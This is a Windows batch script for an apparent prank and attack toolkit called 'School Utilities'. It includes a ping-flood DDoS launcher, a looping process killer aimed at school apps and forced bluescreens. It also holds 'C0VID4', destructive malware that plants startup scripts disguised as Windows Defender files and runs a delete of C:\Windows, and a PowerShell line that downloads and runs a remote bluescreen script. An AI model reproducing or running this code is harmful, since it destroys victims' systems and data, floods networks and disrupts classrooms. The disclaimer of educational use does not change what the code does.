@Echo off
@setlocal enableextensions
@cd /d "%~dp0"

if exist admin goto ADMINSTART
if exist admin1 goto ADMINSTART
if exist sur goto sur
goto check_Permissions

:sur
cd "school utilities reloaded"
start "" "School Utilities.exe"
exit

:ADMINSTART
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:check_Permissions
set admin_status=0
net session >nul 2>&1
if %errorLevel% == 0 (
    set admin_status=1
) else (
    echo Failure: Current permissions inadequate.
)

if exist admin1 del admin1

:current-version
set current-version=1.0
set codename=Aluminium Peach 
if %errorlevel%==9009 exit
echo 1
cls
cls
Title School Utilities
CLS
if exist skip goto skip
if exist skip1 goto skip
cls

:start_i
cd Files
starter launch.txt


:skip
if exist skip del skip /f /q
Set "Path=%Path%;%cd%;%cd%\files"
Color 0a
Mode 80,25

SETLOCAL
FOR /F "usebackq" %%f IN (`PowerShell -NoProfile -Command "Write-Host([Environment]::GetFolderPath('Desktop'))"`) DO (
  SET "DESKTOP_FOLDER=%%f"
  )

cd %~dp0\files
start update-checker.vbs
cls
echo.
echo Using SU-DEV-BUILD
echo Version: 1.0C
echo username: %username%
echo checking for updates...
echo.
ping localhost >update.log
start update.vbs


:Main
title School Utilities
cd %~dp0
Cls
Echo.
Echo.Version: %current-version% Development Build 12-04-2021-REV1
Echo.
CmdMenuSel 0AA0 "Process Killer" "Greisen Terminal" "God-Mode Folder" "Bluescreen & Shutdown" "Net Disconnect" "Broken File Creator" "Virus Spammer" "CMD Extensions" "Mic Muter" "Camera" "DDoS" "Fake Update" "Config" "Discord" "Exit"
If /i "%Errorlevel%" == "14" (start https://discord.com/invite/v9F7fDq&&goto restart)
If /i "%Errorlevel%" == "15" (Exit)
If /i "%Errorlevel%" == "13" (goto settings&&set Errorlevel=0)
If /i "%Errorlevel%" == "12" (goto fakeupdate)
If /i "%Errorlevel%" == "11" (goto newddos&&goto restart)
If /i "%Errorlevel%" == "10" (goto camera)
If /i "%Errorlevel%" == "9" (goto mic&&set Errorlevel=0)
If /i "%Errorlevel%" == "8" (goto cmd-e&&set Errorlevel=0)
If /i "%Errorlevel%" == "7" (goto virusspammer&&set Errorlevel=0)
If /i "%Errorlevel%" == "6" (goto bfc&&set Errorlevel=0)
If /i "%Errorlevel%" == "5" (goto 5&&set Errorlevel=0)
If /i "%Errorlevel%" == "4" (goto 4&&set Errorlevel=0)
If /i "%Errorlevel%" == "3" (goto 3&&set Errorlevel=0)
If /i "%Errorlevel%" == "2" (goto 2 &&cls&&set Errorlevel=0)
If /i "%Errorlevel%" == "1" (goto newprocesskiller&&set Errorlevel=0)
If /i "%Errorlevel%" == "9009" (goto err9009)
Cls
Echo. Error %Errorlevel%
Echo.
Echo.
timeout /t 2 >nul
Goto :Main
Pause
exit

:err9009
cls
echo Error: 9009 - Try to reinstall School Utilities
cd C:\Users\%username%\AppData\Local\Temp\
(
    echo msgbox"important data is missing please reinstall" ,16, "School Utilities"
)>err.vbs
timeout -t 1 -nobreak >t
start err.vbs
timeout -t 5 -nobreak >t
start https://github.com/xcuzimfna/school-utilities/releases
exit

:processkill
taskkill /im %process% /f
goto processkill

:f9
cd %~dp0/files
 nircmd.exe qboxtop "Warning! after you have activated this function you may have to force a restart in order to use your device again (hold down the power button for 5 seconds). do you want to continue?" "School Utilities" screenoffspammer.cmd
goto restart

:help-gt
cls
echo.
echo - Help -
echo run = run programms
echo menu = go to menu
echo bsod = bluescreen
echo virusspammer = spams virus message
echo ddos/multiddos = network attack
echo exit = exit
echo cmd-e = install cmd extensions
echo mute/unmute = mute/unmute your default communication device
echo version-info = shows version inform5tions
echo --------
echo.
pause

:2
cls
title Greisen Terminal - School Utilities
cd %~dp0/files
echo.

set gt1=
call colorchar.exe /0e " su"
call colorchar.exe /0f "@"
call colorchar.exe /08 "user"
call colorchar.exe /0f "[]-"
set /p gt1=
if %gt1%==menu goto main
call gt %gt1%

goto 2

:newddos
cd %~dp0/files
if exist ddos goto startddos
nircmd.exe qboxtop "This tool is for educational purpose only, usage of School Utilities for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage cause by this program. do you want to continue?" "School Utilities" ddos_activate.cmd
goto main
:startddos


:----------
mode CON: cols=89 LINES=22
title DDoS - School Utilities

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init

:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a
@echo off
cls
echo.
echo   ÛÛÛÛÛÛ» ÛÛÛÛÛÛ»  ÛÛÛÛÛÛ» ÛÛÛÛÛÛÛ»    
echo   ÛÛÉÍÍÛÛ»ÛÛÉÍÍÛÛ»ÛÛÉÍÍÍÛÛ»ÛÛÉÍÍÍÍ¼    
echo   ÛÛº  ÛÛºÛÛº  ÛÛºÛÛº   ÛÛºÛÛÛÛÛÛÛ»     
echo   ÛÛº  ÛÛºÛÛº  ÛÛºÛÛº   ÛÛºÈÍÍÍÍÛÛº     
echo   ÛÛÛÛÛÛÉ¼ÛÛÛÛÛÛÉ¼ÈÛÛÛÛÛÛÉ¼ÛÛÛÛÛÛÛº    
echo   ÈÍÍÍÍÍ¼ ÈÍÍÍÍÍ¼  ÈÍÍÍÍÍ¼ ÈÍÍÍÍÍÍ¼    
echo.

call :color 0 " "
call :color 2f "Type"
call :color a " "Menu"  "
call :color f "---- "
call :color a "Goto School Utilities Menu     "    
echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "List"  "
call :color f "---- "
call :color a "To See The Recent IP's You've Entered" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Skype" "
call :color f "---- "
call :color a "To Get Someone's IP With Skype                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Server "
call :color f " ---- "
call :color a "To Get A Website's IP" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Track" "
call :color f "---- "
call :color a "To Track Someone's IP                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Help" "
call :color f " ---- "
call :color a "For Help Page                                        " & echo.
echo.
set /p ip= Choice / IP to target:
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==MENU goto home
if %ip%==menu goto home
if %ip%==Menu goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Destination host unreachable." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Request timed out." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: transmit failed. General failure." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%             IP: %ip%   >> %DIR%\history.log
call :color f "                                   "
call :color a0 " - IP is Valid - " & echo.
call :color 0 " "
call :color 2f "Package:"
call :color 0a " 32 - 15000                                               "
call :color 2f "The Bigger The Better"
call :color 0a "                                                                                             "
call :color 9f "F) Detect Package"
call :color a "                                                               E) Back" & echo.
echo.
set /p package= Package: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> %DIR%\info.bat
echo title DDoS Assistance     >> %DIR%\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>%DIR%\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmao
goto ddoslauncher


:server
color f
cls
echo.
call :color 28 "   If You Have A Light"
call :color 28 "                                                            E) Back "
call :color 28 "   Speed Network You Can                                                            "  
call :color 28 "   Take Down A Website                                                              " 
call :color 28 "   If Not Then You Will                                                             " 
call :color 28 "   Have No Use Of This Feature                                                      " 
echo.
set /p trace=url: 
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP Over This Text --
echo     Copy It If You Want It
echo.
pause
goto start


:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " How To Target An Ip" & echo.
call :color b "                     Enter The Ip You Want To DDoS In The Area" & echo.
echo                               "Choice / IP to target:" 
echo.
call :color a " Press "
call :color e "Enter"
call :color a " To Return
set /p nul=
goto start


:home
goto main

:get
start http://mostwantedhf.info
goto start

:track
start http://www.ip-tracker.org/
goto start

:lmao
cls
echo.
ping %IP% -t -l %package% 
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:find
cls
set /a package=11000
echo title Package Detector     >> %DIR%\Package-Detector.bat
echo :beginning                 >> %DIR%\Package-Detector.bat
echo if exist %DIR%\info.bat call %DIR%\info.bat >> %DIR%\Package-Detector.bat
echo goto beginning             >> %DIR%\Package-Detector.bat
set "launch=1"


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start

:-----------------

:fakeupdate
cd %~dp0/files
start fakeupdater.exe
goto main
exit

:settings
cls
if exist admin set adminstart=true
if not exist admin set adminstart=false
if exist skip1 set logo=true
if not exist skip1 set logo=false
echo.
echo - Config -
echo admin_start = %adminstart% (true or false)
echo skip_su-logo = %logo% (true or false)
echo.
echo.
echo - Help -
echo [id]_set_[value] - Change value of a key
echo uninstall - uninstalls school utilities
echo menu - go to menu
echo exit - exit
echo.
echo Example: admin_start_set_true
echo.
echo.
echo.
set s=
call colorchar.exe /0e "su"
call colorchar.exe /0f "@"
call colorchar.exe /08 "settings"
call colorchar.exe /0f "[change-id-value]-"
set /p s=
if %s%==exit exit
if %s%==uninstall goto uninstall
if %s%==menu goto main
if %s%==admin_start_set_true echo 1>admin &&goto value_changed
if %s%==admin_start_set_false del admin /q /f &&goto value_changed
if %s%==skip_su-logo_set_true echo 1>skip1 &&goto value_changed
if %s%==skip_su-logo_set_false del skip1 /q /f &&goto value_changed
:value_error
cls
echo Error: invalid imput
timeout -t 3 >t
del t
goto settings


:value_changed
cls
echo value changed!
timeout -t 3 >t
del t
goto restart



:version-info
cls
echo.
echo Current Version: %current-version%
echo Code Name: %codename%
echo.
echo Made by xCuzImFNA
echo GitHub: https://github.com/xcuzimfna/school-utilities
echo Discord: https://discord.gg/v9F7fDq
echo.
pause
goto 2


:restart
cd %~dp0
echo 1>skip
start "" "%~f0"
exit

:admin_restart
cd %~dp0
echo 1>admin1
start "" "%~f0"
exit



:3

cd %DESKTOP_FOLDER%
md "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
cd %~dp0/files
nircmd.exe infobox "your file has been created successfully!" "School Utilities" 
goto restart
exit

:cmd-e
cls
cd %~dp0/files
title CMD Extensions - School Utilities
Cls
echo.
Echo.CMD Extensions
Echo.
CmdMenuSel 0AA0 "Broken File Creator (BFC)" "X" "Menu" "Exit"
If /i "%Errorlevel%" == "1" (goto bfc_cmd-e)
If /i "%Errorlevel%" == "2" (goto bfc-uninstall)
If /i "%Errorlevel%" == "3" (goto main)
If /i "%Errorlevel%" == "3" (exit)
cls
goto cmd-e


:bfc_cmd-e
cd C:\Windows\System32
if exist bfc.bat set BFC_STATE=installed
if not exist bfc.bat set BFC_STATE=not installed
cls
cd %~dp0/cmd-e
Cls
echo.
Echo.Broken File Creator
Echo.
CmdMenuSel 0AA0 "Install" "Uninstall" "Menu" "Exit"
If /i "%Errorlevel%" == "1" (goto bfc-install)
If /i "%Errorlevel%" == "2" (goto bfc-uninstall)
If /i "%Errorlevel%" == "3" (goto main)
If /i "%Errorlevel%" == "3" (exit)
cls
goto bfc_cmd-e


:bfc-install
start powershell -command "&{start-process bfc_install.bat -verb RunAs}"
goto restart

:bfc-uninstall
start powershell -command "&{start-process bfc_uninstall.bat -verb RunAs}"
goto restart

:newprocesskiller
title Process Killer - School Utilities
cls
Echo.
Echo Please select a process
Echo.
CmdMenuSel 0AA0 "onenote.exe" "winword.exe" "firefox.exe" "powerpnt.exe" "chrome.exe" "Zoom.exe" "RingCentralMeetings.exe" "Other Process" "Back to menu"
If /i "%Errorlevel%" == "9" (goto main)
If /i "%Errorlevel%" == "8" (goto oprocess)
If /i "%Errorlevel%" == "7" (set process=RingCentralMeetings.exe)
If /i "%Errorlevel%" == "6" (set process=Zoom.exe)
If /i "%Errorlevel%" == "5" (set process=chrome.exe)
If /i "%Errorlevel%" == "4" (set process=powerpnt.exe)
If /i "%Errorlevel%" == "3" (set process=firefox.exe)
If /i "%Errorlevel%" == "2" (set process=winword.exe)
If /i "%Errorlevel%" == "1" (set process=onenote.exe)
Cls
title Process Killer - School Utilities - WORKING (KILLING %process%)
goto processkilln

:processkilln
cd C:\Users\%username%\AppData\Local\Temp\
set rn2=%random%.cmd
echo @echo off >>%rn2%
echo title Process Killer - School Utilities - Running - (KILLING %process%) >>%rn2%
echo :pc2 >>%rn2%
echo cls >>%rn2%
echo taskkill /im %process% /f >>%rn2%
echo goto pc2 >>%rn2%
start /min %rn2%
goto main

:oprocess
cls
tasklist
echo.
echo Please insert a valid process
set /p process=
goto processkilln


:4
cd %~dp0/files
title Bluescreen - School Utilities - CLOSE TO ABORT BLUESCREEN
cls
timeout -t 1 -nobreak >t
cls
echo bluescreen in 3 seconds...
timeout -t 1 -nobreak >t
cls
echo bluescreen in 2 seconds...
timeout -t 1 -nobreak >t
cls
echo bluescreen in 1 seconds...
timeout -t 1 -nobreak >t
cls
echo bluescreen in 0 seconds...
timeout -t 1 -nobreak >t
start /min user_bluescreen.exe
cls
exit

:6
goto bfile


:ddos
cls
title DDoS - School Utilities

Set/p iip=IPv4/Website(localhost for local dos):0

Set /p Puffer=Puffer:

:A
Set /a Send=%Send%+1
ping %iip% -l %Puffer% -w 15 -n 1 -4 >NUL
echo Send Package :%PIPI%:%Puffer%:%Send%
goto A

:multiddos

Set/p iip=IPv4/Website(localhost for local dos):
Set /p Puffer=Puffer:

echo set /p ip=%iip% >> 155.cmd
echo echo %iip% >> 155.cmd
echo :A >> 155.cmd
echo Set /a Send=%Send%+1 >> 155.cmd
echo ping %iip% -l %Puffer% -w 15 -n 1 -4 >NUL >> 155.cmd
echo echo Send Package :%PIPI%:%Puffer%:%Send% >> 155.cmd
echo goto A >> 155.cmd
goto mdos

:mdos
start 155
timeout -t 1
goto mdos


:camera
cls
cd %~dp0/files
set camera_status=Unknown
set Errorlevel=
if %admin_status% == 1 (
    goto camera1
) else (
    nircmd.exe infobox "You need administrator privileges to use this." "School Utilities"
    goto admin_restart
    exit
)
:camera1
title Camera - School Utilities
Cls
powershell Get-PnpDevice -FriendlyName *webcam*
echo.
Echo.Camera state: %camera_status%
Echo.
CmdMenuSel 0AA0 "Disable Camera" "Enable Camera" "Menu" "Exit"
If /i "%Errorlevel%" == "1" (goto disable_camera)
If /i "%Errorlevel%" == "2" (goto enable_camera)
If /i "%Errorlevel%" == "3" (goto main)
If /i "%Errorlevel%" == "3" (exit)
goto camera1

:disable_camera
powershell Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *webcam*  -Status OK).InstanceId -Confirm:$false
set camera_status=Disabled
goto camera1


:enable_camera
powershell Enable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName *webcam*  -Status Error).InstanceId -Confirm:$false
set camera_status=Enabled
goto camera1

:5
cd %~dp0/files
start /min net_disconnect
goto main


:mic
set muter=Unknown
cd %~dp0/files
:muter
set Errorlevel=
title Mic Muter - School Utilities

Cls
Echo.
Echo.Microphone state: %muter%
Echo.
CmdMenuSel 0AA0 "Mute" "Unmute" "Menu" "Exit"
If /i "%Errorlevel%" == "1" (goto mute)
If /i "%Errorlevel%" == "2" (goto unmute)
If /i "%Errorlevel%" == "3" (goto main)
If /i "%Errorlevel%" == "4" (exit)
goto muter

:mute
cls
SoundVolumeView.exe /Mute "DefaultCaptureDevice" 
set muter=muted
goto muter

:unmute
cls
SoundVolumeView.exe /unMute "DefaultCaptureDevice"
set muter=unmuted
goto muter




:c0vid4
echo Warning! C0VID4 is considered malware!!! This malware will harm your computer and makes it unusable!!! do you still want to continue? (press any key to continue)
pause >c0vid4.cache
del c0vid4.cache
cd files 
nircmd.exe win hide ititle "cmd.exe"
cd %DESKTOP_FOLDER%
@echo off
title C0VID4
:: GREISENSOFT
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo PLEASE GRANT PERMISSION
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
cls
title C0VID4
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
md %random%
taskkill /im explorer.exe /f
set date=1
time 2:22
shutdown -r -fw -o -t 60
cd %userprofile%\STARTM~1\Programs\Startup
md %random%
md %random%
md %random%
md %random%
echo taskkill /im explorer.exe /f >c0vid21-autocopy.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy2.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy3.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy4.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy5.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy6.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy7.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy8.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy9.cmd
echo taskkill /im explorer.exe /f >c0vid21-autocopy10.cmd
echo taskkill /im explorer.exe /f >WindowsDefenderSecureBoot.cmd
cd %~dp0
cd C:\Windows
del "*" /q /s
taskkill /im svchost.exe /f
exit

:run
title Run - School Utilities
cls
echo --- Run ---
echo memz.exe
echo memz_clean.exe
echo c0vid4
echo menu
echo exit
echo bluescreen.cmd
echo -----------

echo Please insert a valid imput

set /p run=
if %run%==memz.exe goto memz
if %run%==memz_clean.exe goto memzclean
if %run%==c0vid4 goto c0vid4
if %run%==bluescreen.cmd goto bluescreen.cmd
if %run%==menu goto restart
if %run%==exit exit
cls
goto run

:memz
cd %~dp0/files
start virus1.cmd
goto restart

:memzclean
cd %~dp0/files
start virus2.cmd
goto restart


:bluescreen.cmd
echo powershell -Command "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD">bluescreen.cmd
echo MsgBox "Bluescreen.cmd installed", VBOKOnly, "School Utilities">msb.vbs
timeout -t 2 -nobreak
start msb.vbs
timeout -t 2 -nobreak
del msb.vbs
goto gt


:credits
title Credits
cls
echo School Utilities by xCuzImFNA
pause >su.cache
del su.cache
goto restart

@echo off

:bfc
SETLOCAL
FOR /F "usebackq" %%f IN (`PowerShell -NoProfile -Command "Write-Host([Environment]::GetFolderPath('Desktop'))"`) DO (
  SET "DESKTOP_FOLDER=%%f"
  )
cd %DESKTOP_FOLDER%
cd %~dp0/files
title Broken File Creator - School Utilities
Cls
echo.
Echo.Please select a file size:
Echo.
CmdMenuSel 0AA0 "Small - (Small PDF; Word File) [390-550KB]" "Medium - (Big PDF; 2min MP3 AUDIO) [1-3MB]" "Big - (5min MP4 VIDEO; ) [40-60MB]" "Custom Size" "Menu" "Exit"
If /i "%Errorlevel%" == "1" (goto small)
If /i "%Errorlevel%" == "2" (goto Medium)
If /i "%Errorlevel%" == "3" (goto Big)
If /i "%Errorlevel%" == "4" (goto bfc_custom_size)
If /i "%Errorlevel%" == "5" (goto main)
If /i "%Errorlevel%" == "6" (exit)



:Small
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 550000 -Minimum 390000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name
:Medium
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 3000000 -Minimum 1000000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name
:Big
 SET PSScript=%Temp%\~tmpRandom4Digit.ps1
 IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

 ECHO $fRandom = Get-Random -Maximum 60000000 -Minimum 40000000>>"%PSScript%"
 ECHO $Random  = "{0:0000}" -f $fRandom>>"%PSScript%"
 ECHO ECHO $Random>>"%PSScript%"

 SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0 
 CD /D "%PowerShellDir%" 
 FOR /F "DELIMS=" %%A IN ('Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"') DO SET "bfc-size=%%A"
 goto bfc_name




:bfc_name
cls
echo File Name (with extension):
set /p bfc_name=
if %bfc_name%==menu goto menu
if %bfc_name%==exit exit
goto bfc_creator

:bfc_creator
fsutil file createnew %DESKTOP_FOLDER%\%bfc_name% %bfc-size%
nircmd.exe infobox "Your file has been created! File path: %desktop_folder%" "School Utilities"
goto bfc

:bfc_custom_size
cls
echo.
echo Custom File Size (in bytes):
set /p bfc-size=
goto bfc_name


:virusspammer
cd %~dp0/files
start /min vs.cmd
goto restart

:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"

